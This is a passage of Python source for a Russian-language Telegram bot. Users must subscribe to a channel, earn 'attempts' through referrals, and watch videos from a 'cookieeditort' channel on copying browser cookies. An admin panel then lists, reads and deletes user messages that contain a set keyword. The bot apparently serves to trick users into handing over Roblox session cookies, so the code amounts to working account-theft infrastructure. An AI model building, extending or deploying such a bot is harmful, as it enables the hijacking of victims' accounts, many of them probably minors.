    keyboard.append([InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if len(text) > 4096:
        parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
        for part in parts:
            await query.message.reply_text(part)
        await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
    else:
        await query.edit_message_text(text, reply_markup=reply_markup)

async def show_chat_users_page(query, context, page=0, per_page=10):
    user_id = query.from_user.id
    users = get_all_users()
    if not users:
        await query.edit_message_text(get_text(user_id, "no_users"))
        return
    
    users_list = list(users.items())
    total_users = len(users_list)
    total_pages = (total_users + per_page - 1) // per_page
    
    if page >= total_pages:
        page = total_pages - 1
    
    start_idx = page * per_page
    end_idx = min(start_idx + per_page, total_users)
    current_users = users_list[start_idx:end_idx]
    
    text = get_text(user_id, "chat_select_user", total=total_users, page=page+1, total_pages=total_pages)
    
    keyboard = []
    for user_id_str, user_data in current_users:
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        has_keyword = "✅" if is_keyword_user(user_id_str) else "❌"
        msg_count = len(get_user_messages(user_id_str))
        attempts = get_user_attempts(user_id_str)
        button_text = f"👤 {name} (@{username}) {has_keyword} 📩{msg_count} 🎯{attempts}"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"chat_user_{user_id_str}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "prev"), callback_data=f"chat_users_page_{page - 1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "next"), callback_data=f"chat_users_page_{page + 1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text + "✅ - " + get_text(user_id, "keyword_only").replace("🔑 ", "") + "\n❌ - " + get_text(user_id, "no_keyword_messages").split(" ")[0] + "\n📩 - " + get_text(user_id, "message_received").split(" ")[0] + "\n🎯 - " + get_text(user_id, "give_attempts").replace("🎯 ", ""),
        reply_markup=reply_markup
    )

async def show_keyword_messages_page(query, context, page=0, per_page=10):
    user_id = query.from_user.id
    users = get_keyword_users()
    if not users:
        await query.edit_message_text(get_text(user_id, "no_keyword_users"))
        return
    
    users_list = list(users.items())
    total_users = len(users_list)
    total_pages = (total_users + per_page - 1) // per_page
    
    if page >= total_pages:
        page = total_pages - 1
    
    start_idx = page * per_page
    end_idx = min(start_idx + per_page, total_users)
    current_users = users_list[start_idx:end_idx]
    
    text = "👥 **" + get_text(user_id, "cookies") + ":**\n\n"
    text += get_text(user_id, "chat_select_user", total=total_users, page=page+1, total_pages=total_pages)
    
    keyboard = []
    for user_id_str, user_data in current_users:
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        keyboard.append([InlineKeyboardButton(f"👤 {name} (@{username})", callback_data=f"view_user_{user_id_str}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "prev"), callback_data=f"keyword_messages_page_{page - 1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "next"), callback_data=f"keyword_messages_page_{page + 1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton(get_text(user_id, "back"), callback_data="view_keyword_users_only")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

# ===================================================
# ФУНКЦИЯ ДЛЯ ВЫБОРА ПОЛЬЗОВАТЕЛЯ ДЛЯ ВЫДАЧИ ПОПЫТОК
# ===================================================

async def show_give_attempts_page(query, context, page=0, per_page=10):
    user_id = query.from_user.id
    users = get_all_users()
    if not users:
        await query.edit_message_text(get_text(user_id, "no_users"))
        return
    
    users_list = list(users.items())
    total_users = len(users_list)
    total_pages = (total_users + per_page - 1) // per_page
    
    if page >= total_pages:
        page = total_pages - 1
    
    start_idx = page * per_page
    end_idx = min(start_idx + per_page, total_users)
    current_users = users_list[start_idx:end_idx]
    
    text = get_text(user_id, "give_attempts_menu", total=total_users, page=page+1, total_pages=total_pages)
    
    keyboard = []
    for user_id_str, user_data in current_users:
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        attempts = get_user_attempts(user_id_str)
        button_text = f"👤 {name} (@{username}) 🎯{attempts}"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"give_attempts_user_{user_id_str}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "prev"), callback_data=f"give_attempts_page_{page - 1}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton(get_text(user_id, "next"), callback_data=f"give_attempts_page_{page + 1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton(get_text(user_id, "give_all_zero"), callback_data="give_all_zero")])
    keyboard.append([InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

# ===================================================
# ФУНКЦИЯ ДЛЯ ВЫДАЧИ ПОПЫТОК ВСЕМ У КОГО 0
# ===================================================

async def give_attempts_to_all_zero(query, context):
    user_id = query.from_user.id
    all_users = get_all_users()
    if not all_users:
        await query.edit_message_text(get_text(user_id, "no_users"))
        return
    
    zero_users = []
    for user_id_str in all_users.keys():
        attempts = get_user_attempts(user_id_str)
        if attempts <= 0:
            zero_users.append(user_id_str)
    
    if not zero_users:
        await query.edit_message_text(get_text(user_id, "give_all_zero_no_users"))
        return
    
    keyboard = [
        [InlineKeyboardButton("✅ " + get_text(user_id, "yes_delete").replace("✅ ", ""), callback_data="confirm_give_all_zero")],
        [InlineKeyboardButton(get_text(user_id, "cancel"), callback_data="give_attempts_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        get_text(user_id, "give_all_zero_confirm", count=len(zero_users)),
        reply_markup=reply_markup
    )

async def execute_give_all_zero(query, context):
    user_id = query.from_user.id
    all_users = get_all_users()
    zero_users = []
    for user_id_str in all_users.keys():
        attempts = get_user_attempts(user_id_str)
        if attempts <= 0:
            zero_users.append(user_id_str)
    
    if not zero_users:
        await query.edit_message_text(get_text(user_id, "give_all_zero_no_users"))
        return
    
    success = 0
    failed = 0
    
    status_msg = await query.edit_message_text(
        get_text(user_id, "mailing_start", count=len(zero_users))
    )
    
    for user_id_str in zero_users:
        try:
            add_attempts(user_id_str, 1)
            success += 1
            await asyncio.sleep(0.1)
        except Exception as e:
            failed += 1
            print(f"Ошибка выдачи попытки {user_id_str}: {e}")
    
    await status_msg.edit_text(
        get_text(user_id, "give_all_zero_success", success=success, failed=failed, total=success)
    )

# ===================================================
# ОБРАБОТЧИК ВЫБОРА ЯЗЫКА
# ===================================================

async def language_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показывает выбор языка при первом запуске"""
    keyboard = [
        [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")],
        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🌐 **Выберите язык / Choose language:**\n\n"
        "🇷🇺 Русский\n"
        "🇬🇧 English\n\n"
        "Выберите язык, на котором вы хотите общаться с ботом.\n"
        "Select the language you want to use.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# ===================================================
# ОБРАБОТЧИК КОМАНДЫ /start
# ===================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # ✅ СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ СРАЗУ ПРИ ЗАПУСКЕ
    save_all_user(
        user_id=user_id,
        username=user.username or "no_username",
        first_name=user.first_name or "Unknown"
    )
    
    # Проверяем, есть ли у пользователя выбранный язык
    if not os.path.exists(LANGUAGE_FILE) or str(user_id) not in json.load(open(LANGUAGE_FILE, "r", encoding="utf-8")) if os.path.exists(LANGUAGE_FILE) else True:
        await language_selection(update, context)
        return
    
    await show_main_menu(update, context)

# ===================================================
# ФУНКЦИЯ ПОКАЗА ГЛАВНОГО МЕНЮ
# ===================================================

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # ✅ ОБНОВЛЯЕМ ДАННЫЕ ПОЛЬЗОВАТЕЛЯ
    save_all_user(
        user_id=user_id,
        username=user.username or "no_username",
        first_name=user.first_name or "Unknown"
    )
    
    # Проверяем подписку для обычных пользователей
    if user_id != YOUR_USER_ID:
        is_subscribed = await check_subscription(user_id, context)
        if not is_subscribed:
            keyboard = [
                [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
                [InlineKeyboardButton(get_text(user_id, "subscribed_button"), callback_data="check_subscription")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                get_text(user_id, "check_subscription"),
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return
    
    user_name = user.first_name
    attempts = get_user_attempts(user_id)
    referrals = get_referral_count(user_id)
    
    keyboard = [
        [
            InlineKeyboardButton(get_text(user_id, "device"), callback_data="device"),
            InlineKeyboardButton(get_text(user_id, "cookies"), callback_data="cookies"),
        ],
        [
            InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
            InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
        ],
        [
            InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language"),
        ]
    ]
    
    if user_id == YOUR_USER_ID:
        keyboard.append([
            InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users"),
            InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only"),
        ])
        keyboard.append([
            InlineKeyboardButton(get_text(user_id, "stats"), callback_data="view_stats"),
            InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat"),
        ])
        keyboard.append([
            InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu"),
            InlineKeyboardButton(get_text(user_id, "mailing"), callback_data="send_mailing"),
        ])
        keyboard.append([
            InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if hasattr(update, 'callback_query') and update.callback_query:
        await update.callback_query.edit_message_text(
            get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
            reply_markup=reply_markup
        )
    elif hasattr(update, 'message'):
        await update.message.reply_text(
            get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
            reply_markup=reply_markup
        )

# ===================================================
# ОБРАБОТЧИК НАЖАТИЙ НА КНОПКИ
# ===================================================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    is_admin = (user_id == YOUR_USER_ID)
    data = query.data
    
    # --- ВЫБОР ЯЗЫКА ---
    if data.startswith("lang_"):
        lang = data.replace("lang_", "")
        set_user_language(user_id, lang)
        
        if lang == "ru":
            await query.edit_message_text(get_text(user_id, "language_changed"))
        else:
            await query.edit_message_text("✅ Language changed to English!")
        
        # Показываем главное меню после выбора языка
        user_name = update.effective_user.first_name
        
        # Проверяем подписку
        if user_id != YOUR_USER_ID:
            is_subscribed = await check_subscription(user_id, context)
            if not is_subscribed:
                keyboard = [
                    [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
                    [InlineKeyboardButton(get_text(user_id, "subscribed_button"), callback_data="check_subscription")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await query.message.reply_text(
                    get_text(user_id, "check_subscription"),
                    reply_markup=reply_markup,
                    parse_mode='Markdown'
                )
                return
        
        await show_main_menu_by_query(query, context, user_id)
        return
    
    # --- СМЕНА ЯЗЫКА (НОВАЯ КНОПКА) ---
    if data == "change_language":
        keyboard = [
            [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")],
            [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            get_text(user_id, "choose_language"),
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # --- ПРОВЕРКА ПОДПИСКИ ---
    if data == "check_subscription":
        is_subscribed = await check_subscription(user_id, context)
        if is_subscribed:
            await show_main_menu_by_query(query, context, user_id)
        else:
            keyboard = [
                [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
                [InlineKeyboardButton(get_text(user_id, "subscribed_button"), callback_data="check_subscription")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                get_text(user_id, "not_subscribed"),
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        return
    
    # --- ПОКУПКА ROBLOX ---
    if data == "buy_roblox":
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            get_text(user_id, "buy_roblox_title"),
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # --- РЕФЕРАЛЬНАЯ СИСТЕМА ---
    if data == "referral":
        referrals = get_referral_count(user_id)
        attempts = get_user_attempts(user_id)
        
        bot_username = context.bot.username or "YourBot"
        referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            get_text(user_id, "referral_text", attempts=attempts, referrals=referrals, link=referral_link),
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # --- ОБЫЧНЫЕ КНОПКИ (ДОСТУПНЫ ВСЕМ) ---
    if data == "device":
        if user_id != YOUR_USER_ID:
            is_subscribed = await check_subscription(user_id, context)
            if not is_subscribed:
                keyboard = [
                    [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
                    [InlineKeyboardButton(get_text(user_id, "subscribed_button"), callback_data="check_subscription")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await query.edit_message_text(
                    get_text(user_id, "not_subscribed"),
                    reply_markup=reply_markup,
                    parse_mode='Markdown'
                )
                return
        
        attempts = get_user_attempts(user_id)
        
        if attempts <= 0:
            keyboard = [
                [InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral")],
                [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
                [InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                get_text(user_id, "no_attempts"),
                reply_markup=reply_markup
            )
            return
        
        keyboard = [
            [
                InlineKeyboardButton(get_text(user_id, "phone"), callback_data="phone"),
                InlineKeyboardButton(get_text(user_id, "computer"), callback_data="computer"),
            ],
            [
                InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language"),
            ],
            [
                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            get_text(user_id, "device_choice", attempts=attempts),
            reply_markup=reply_markup
        )
        return
    
    elif data == "phone":
        keyboard = [
            [
                InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language"),
                InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_phone"),
            ],
            [
                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_video(
            video="https://t.me/cookieeditort/3",
            caption=get_text(user_id, "phone_video"),
            reply_markup=reply_markup
        )
        await query.delete_message()
        return
    
    elif data == "computer":
        keyboard = [
            [
                InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language"),
                InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_computer"),
            ],
            [
                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_video(
            video="https://t.me/cookieeditort/4",
            caption=get_text(user_id, "computer_video"),
            reply_markup=reply_markup
        )
        await query.delete_message()
        return
    
    elif data == "cookies_copied_phone" or data == "cookies_copied_computer":
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            get_text(user_id, "cookies_sent"),
            reply_markup=reply_markup
        )
        return
    
    elif data == "cookies":
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            get_text(user_id, "cookies_instruction"),
            reply_markup=reply_markup
        )
        return
    
    elif data == "back_to_menu":
        await show_main_menu_by_query(query, context, user_id)
        return
    
    # --- АДМИНСКИЕ КНОПКИ ---
    if not is_admin:
        await query.edit_message_text("⚠️ " + get_text(user_id, "no_attempts").split(" ")[0] + " " + get_text(user_id, "back_to_menu").split(" ")[1])
        return
    
    # ===================================================
    # ОТПРАВКА СООБЩЕНИЯ ПОЛЬЗОВАТЕЛЮ (НОВАЯ ФУНКЦИЯ)
    # ===================================================
    
    if data.startswith("send_msg_to_user_"):
        target_user_id = data.replace("send_msg_to_user_", "")
        context.user_data['chat_target'] = target_user_id
        await query.edit_message_text(
            "✉️ **Введите текст сообщения для пользователя:**\n\n"
            "Просто отправьте текст в этот чат.\n"
            "Для отмены нажмите /cancel"
        )
        return
    
    # ===================================================
    # ВЫДАЧА ПОПЫТОК ВСЕМ У КОГО 0
    # ===================================================
    
    elif data == "give_all_zero":
        await give_attempts_to_all_zero(query, context)
        return
    
    elif data == "confirm_give_all_zero":
        await execute_give_all_zero(query, context)
        return
    
    # ===================================================
    # ВЫДАЧА ПОПЫТОК ОТДЕЛЬНЫМ ПОЛЬЗОВАТЕЛЯМ
    # ===================================================
    
    elif data == "give_attempts_menu":
        await show_give_attempts_page(query, context, 0)
        return
    
    elif data.startswith("give_attempts_page_"):
        page = int(data.replace("give_attempts_page_", ""))
        await show_give_attempts_page(query, context, page)
        return
    
    elif data.startswith("give_attempts_user_"):
        target_user_id = data.replace("give_attempts_user_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        current_attempts = get_user_attempts(target_user_id)
        
        keyboard = [
            [InlineKeyboardButton("➕ +1 " + get_text(user_id, "give_attempts").replace("🎯 ", ""), callback_data=f"give_attempts_add_{target_user_id}_1")],
            [InlineKeyboardButton("➕ +3 " + get_text(user_id, "give_attempts").replace("🎯 ", ""), callback_data=f"give_attempts_add_{target_user_id}_3")],
            [InlineKeyboardButton("➕ +5 " + get_text(user_id, "give_attempts").replace("🎯 ", ""), callback_data=f"give_attempts_add_{target_user_id}_5")],
            [InlineKeyboardButton("➕ +10 " + get_text(user_id, "give_attempts").replace("🎯 ", ""), callback_data=f"give_attempts_add_{target_user_id}_10")],
            [InlineKeyboardButton("🔢 " + get_text(user_id, "give_more"), callback_data=f"give_attempts_input_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="give_attempts_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            get_text(user_id, "give_attempts_user", name=name, username=username, user_id=target_user_id, attempts=current_attempts),
            reply_markup=reply_markup
        )
        return
    
    elif data.startswith("give_attempts_add_"):
        parts = data.replace("give_attempts_add_", "").split("_")
        target_user_id = parts[0]
        count = int(parts[1])
        
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        new_attempts = add_attempts(target_user_id, count)
        
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "give_more"), callback_data=f"give_attempts_user_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="give_attempts_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            get_text(user_id, "give_attempts_success", name=name, username=username, user_id=target_user_id, count=count, new_attempts=new_attempts),
            reply_markup=reply_markup
        )
        return
    
    elif data.startswith("give_attempts_input_"):
        target_user_id = data.replace("give_attempts_input_", "")
        context.user_data['give_attempts_target'] = target_user_id
        await query.edit_message_text(get_text(user_id, "enter_count"))
        return
    
    # ===================================================
    # МЕНЮ УДАЛЕНИЯ ПОЛЬЗОВАТЕЛЕЙ
    # ===================================================
    
    elif data == "delete_users_menu":
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "delete_single_user"), callback_data="delete_single_user")],
            [InlineKeyboardButton(get_text(user_id, "delete_all_users"), callback_data="delete_all_users_confirm")],
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            get_text(user_id, "delete_users_menu"),
            reply_markup=reply_markup
        )
        return
    
    elif data == "delete_single_user":
        users = get_keyword_users()
        if not users:
            await query.edit_message_text(get_text(user_id, "no_keyword_users"))
            return
        
        keyboard = []
        for user_id_str, user_data in users.items():
            name = user_data.get("first_name", "Unknown")
            username = user_data.get("username", "no_username")
            button_text = f"🗑 {name} (@{username})"
            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"confirm_delete_{user_id_str}")])
        
        keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
        keyboard.append([InlineKeyboardButton(get_text(user_id, "back"), callback_data="delete_users_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🗑 **" + get_text(user_id, "delete_single_user") + ":**\n\n⚠️ " + get_text(user_id, "delete_all_confirm").split("⚠️")[0].strip(),
            reply_markup=reply_markup
        )
        return
    
    elif data.startswith("confirm_delete_"):
        target_user_id = data.replace("confirm_delete_", "")
        users = get_keyword_users()
        user_data = users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "yes_delete"), callback_data=f"execute_delete_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "cancel"), callback_data="delete_single_user")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            get_text(user_id, "delete_confirm", name=name, username=username, user_id=target_user_id),
            reply_markup=reply_markup
        )
        return
    
    elif data.startswith("execute_delete_"):
        target_user_id = data.replace("execute_delete_", "")
        users = get_keyword_users()
        user_data = users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        if delete_keyword_user(target_user_id):
            await query.edit_message_text(
                get_text(user_id, "delete_success", name=name, username=username, user_id=target_user_id)
            )
        else:
            await query.edit_message_text(
                "❌ " + get_text(user_id, "no_keyword_messages", name=name, username=username).split(" ")[0] + "."
            )
        return
    
    elif data == "delete_all_users_confirm":
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "confirm_delete_all"), callback_data="execute_delete_all")],
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "cancel"), callback_data="delete_users_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            get_text(user_id, "delete_all_confirm", count=len(get_keyword_users())),
            reply_markup=reply_markup
        )
        return
    
    elif data == "execute_delete_all":
        count = len(get_keyword_users())
        if delete_all_keyword_users():
            await query.edit_message_text(
                get_text(user_id, "delete_all_success", count=count)
            )
        else:
            await query.edit_message_text(
                "❌ " + get_text(user_id, "no_keyword_messages", name="", username="").split(" ")[0] + "."
            )
        return
    
    # Рассылка
    if data == "send_mailing":
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "mailing_all"), callback_data="mailing_all")],
            [InlineKeyboardButton(get_text(user_id, "mailing_keyword"), callback_data="mailing_keyword")],
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            get_text(user_id, "mailing_menu"),
            reply_markup=reply_markup
        )
        return
    
    elif data == "mailing_all":
        context.user_data['mailing_type'] = 'all'
        await query.edit_message_text(get_text(user_id, "mailing_all_text"))
        return
    
    elif data == "mailing_keyword":
        context.user_data['mailing_type'] = 'keyword'
        await query.edit_message_text(get_text(user_id, "mailing_keyword_text"))
        return
    
    # Все пользователи (постраничный вывод)
    elif data == "view_all_users":
        await show_users_page(query, context, 0)
        return
    
    elif data.startswith("users_page_"):
        page = int(data.replace("users_page_", ""))
        await show_users_page(query, context, page)
        return
    
    # Только с ключевым словом (постраничный вывод)
    elif data == "view_keyword_users_only":
        await show_keyword_users_page(query, context, 0)
        return
    
    elif data.startswith("keyword_users_page_"):
        page = int(data.replace("keyword_users_page_", ""))
        await show_keyword_users_page(query, context, page)
        return
    
    # Статистика
    elif data == "view_stats":
        all_users = get_all_users()
        keyword_users = get_keyword_users()
        
        total_messages = 0
        if os.path.exists(MESSAGES_FILE):
            with open(MESSAGES_FILE, "r", encoding="utf-8") as f:
                messages = json.load(f)
                total_messages = len(messages)
        
        today = datetime.now().strftime("%Y-%m-%d")
        today_count = sum(1 for user_data in all_users.values() if user_data.get("first_seen", "").startswith(today))
        
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")],
            [InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            get_text(user_id, "admin_stats", total_users=len(all_users), keyword_users=len(keyword_users), messages=total_messages, today=today_count),
            reply_markup=reply_markup
        )
        return
    
    # Выбор пользователя для чата (постраничный вывод)
    elif data == "select_user_for_chat":
        await show_chat_users_page(query, context, 0)
        return
    
    elif data.startswith("chat_users_page_"):
        page = int(data.replace("chat_users_page_", ""))
        await show_chat_users_page(query, context, page)
        return
    
    # Просмотр сообщений с ключевым словом (постраничный вывод)
    elif data == "view_keyword_messages":
        await show_keyword_messages_page(query, context, 0)
        return
    
    elif data.startswith("keyword_messages_page_"):
        page = int(data.replace("keyword_messages_page_", ""))
        await show_keyword_messages_page(query, context, page)
        return
    
    # ===================================================
    # ЧАТ С ПОЛЬЗОВАТЕЛЕМ - ВСЕ СООБЩЕНИЯ
    # ===================================================
    elif data.startswith("chat_user_"):
        target_user_id = data.replace("chat_user_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        messages = get_user_messages(target_user_id)
        if not messages:
            await query.edit_message_text(get_text(user_id, "no_messages", name=name, username=username))
            return
        
        text = get_text(user_id, "chat_title", name=name, username=username, user_id=target_user_id, total=len(messages))
        
        for msg in messages[:50]:
            msg_text = msg.get("text", "")
            time = msg.get("timestamp", "")
            if KEYWORD in msg_text:
                if len(msg_text) > 100:
                    msg_text = msg_text[:100] + "..."
                text += f"🔑 **{time}**\n💬 {msg_text}\n"
            else:
                if len(msg_text) > 100:
                    msg_text = msg_text[:100] + "..."
                text += f"🕐 {time}\n💬 {msg_text}\n"
            text += "─" * 30 + "\n"
        
        if len(messages) > 50:
            text += f"\n... " + get_text(user_id, "show_more", count=len(messages)-50)
        
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "keyword_only"), callback_data=f"chat_user_keyword_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "show_all"), callback_data=f"chat_user_full_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "send_msg_to_user"), callback_data=f"send_msg_to_user_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="select_user_for_chat")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
